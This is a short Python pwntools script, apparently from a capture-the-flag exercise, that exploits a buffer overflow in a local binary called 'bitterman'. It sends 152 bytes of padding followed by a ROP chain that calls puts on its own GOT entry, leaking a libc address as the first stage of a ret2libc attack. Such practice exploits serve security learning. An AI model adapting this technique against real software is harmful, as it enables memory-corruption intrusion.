from pwn import *

p = process('./bitterman')

#p = gdb.debug('./bitterman', 'b main')

context(os="linux", arch="amd64")

#context.log_level = 'DEBUG'

plt_put = p64(0x400520)
got_put = p64(0x600c50)
pop_rdi = p64(0x400853)

junk = "A"*152

payload = junk + pop_rdi + got_put + plt_put

p.recvuntil("name?")
p.sendline("ippsec")
p.recvuntil("message")
p.sendline("1024")
p.recvuntil("text")
p.sendline(payload)
p.recvuntil("Thanks!")

leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
log.success("Leaked_puts@GLIBCL: " + str(leaked_puts))

#raw_input()
#p.interactive()